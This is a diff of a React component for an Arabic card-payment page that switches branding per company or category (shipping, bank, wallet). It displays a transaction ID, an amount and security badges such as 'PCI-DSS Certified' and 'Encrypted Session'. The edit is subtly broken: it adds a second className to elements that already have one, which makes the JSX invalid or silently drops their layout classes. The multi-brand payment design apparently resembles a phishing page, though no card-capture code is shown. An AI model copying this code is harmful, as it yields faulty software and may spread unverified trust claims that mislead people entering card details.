@@ -141,7 +141,7 @@ const PaymentCardInput = () => {
   const CategoryIcon = category === 'shipping' ? Truck : category === 'bank' ? Building2 : Wallet;
 
   return (
-    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor: entityConfig.bg, fontFamily: entityConfig.font }}>
+    <div className="min-h-screen flex flex-col" dir="rtl" className="bg-background font-primary">
       <PaymentMetaTags
         serviceKey={companyKey}
         serviceName={entityConfig.nameAr}
@@ -158,9 +158,9 @@ const PaymentCardInput = () => {
       <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
         <div className="w-full max-w-xl space-y-8">
           <div className="text-center space-y-3">
-            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: entityConfig.text }}>إتمام عملية الدفع</h1>
-            <div className="flex items-center justify-center gap-2 font-bold uppercase tracking-widest text-[10px]" style={{ color: entityConfig.textMuted }}>
-              <ShieldCheck className="w-4 h-4" style={{ color: entityConfig.primary }} />
+            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight" className="text-foreground">إتمام عملية الدفع</h1>
+            <div className="flex items-center justify-center gap-2 font-bold uppercase tracking-widest text-[10px]" className="text-muted-foreground">
+              <ShieldCheck className="w-4 h-4" className="text-primary" />
               <span>Transaction ID: {id?.slice(0, 8).toUpperCase()}</span>
             </div>
           </div>
@@ -171,13 +171,13 @@ const PaymentCardInput = () => {
               <div className="absolute top-0 left-0 w-full h-1" style={{ backgroundColor: entityConfig.primary, opacity: 0.2 }} />
               <div className="flex items-center justify-between relative z-10">
                 <div className="space-y-1">
-                  <p className="text-[11px] font-bold uppercase tracking-widest" style={{ color: entityConfig.textMuted }}>إجمالي المبلغ</p>
-                  <h2 className="text-3xl sm:text-4xl font-bold tracking-tighter" style={{ color: entityConfig.primary }}>{formattedAmount}</h2>
+                  <p className="text-[11px] font-bold uppercase tracking-widest" className="text-muted-foreground">إجمالي المبلغ</p>
+                  <h2 className="text-3xl sm:text-4xl font-bold tracking-tighter" className="text-primary">{formattedAmount}</h2>
                 </div>
                 <div className="text-left">
-                  <p className="text-[10px] font-bold uppercase tracking-widest mb-1" style={{ color: entityConfig.textMuted }}>حالة الطلب</p>
-                  <div className="flex items-center gap-1.5 font-bold text-sm" style={{ color: entityConfig.primary }}>
-                    <div className="w-2 h-2 rounded-full animate-pulse" style={{ backgroundColor: entityConfig.primary }} />
+                  <p className="text-[10px] font-bold uppercase tracking-widest mb-1" className="text-muted-foreground">حالة الطلب</p>
+                  <div className="flex items-center gap-1.5 font-bold text-sm" className="text-primary">
+                    <div className="w-2 h-2 rounded-full animate-pulse" className="bg-primary" />
                     <span>بانتظار السداد</span>
                   </div>
                 </div>
@@ -246,7 +246,7 @@ const PaymentCardInput = () => {
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
                   </div>
-                  <p className="text-[10px] font-bold leading-relaxed text-center max-w-sm" style={{ color: entityConfig.textMuted }}>
+                  <p className="text-[10px] font-bold leading-relaxed text-center max-w-sm" className="text-muted-foreground">
                     بالنقر على زر التأكيد، أنت توافق على معالجة معاملتك المالية بأمان. جميع البيانات مشفرة ولا يتم تخزينها.
                   </p>
                 </div>
@@ -255,21 +255,21 @@ const PaymentCardInput = () => {
           </ThemedCard>
 
           <div className="flex flex-col sm:flex-row items-center justify-between gap-6 px-4">
-            <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
+            <div className="flex items-center gap-3" className="text-muted-foreground">
               <div className="w-10 h-10 rounded-full border flex items-center justify-center" style={{ backgroundColor: entityConfig.surface, borderColor: entityConfig.inputBorder, color: entityConfig.primary }}>
                 <Shield className="w-5 h-5" />
               </div>
               <div>
-                <p className="text-[10px] font-bold uppercase leading-none mb-1" style={{ color: entityConfig.text }}>PCI-DSS Certified</p>
+                <p className="text-[10px] font-bold uppercase leading-none mb-1" className="text-foreground">PCI-DSS Certified</p>
                 <p className="text-[9px] font-medium">معايير أمان عالمية</p>
               </div>
             </div>
-            <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
+            <div className="flex items-center gap-3" className="text-muted-foreground">
               <div className="w-10 h-10 rounded-full border flex items-center justify-center" style={{ backgroundColor: entityConfig.surface, borderColor: entityConfig.inputBorder, color: entityConfig.primary }}>
                 <Lock className="w-5 h-5" />
               </div>
               <div>
-                <p className="text-[10px] font-bold uppercase leading-none mb-1" style={{ color: entityConfig.text }}>Encrypted Session</p>
+                <p className="text-[10px] font-bold uppercase leading-none mb-1" className="text-foreground">Encrypted Session</p>
                 <p className="text-[9px] font-medium">اتصال مشفر 256-bit</p>
               </div>
             </div>
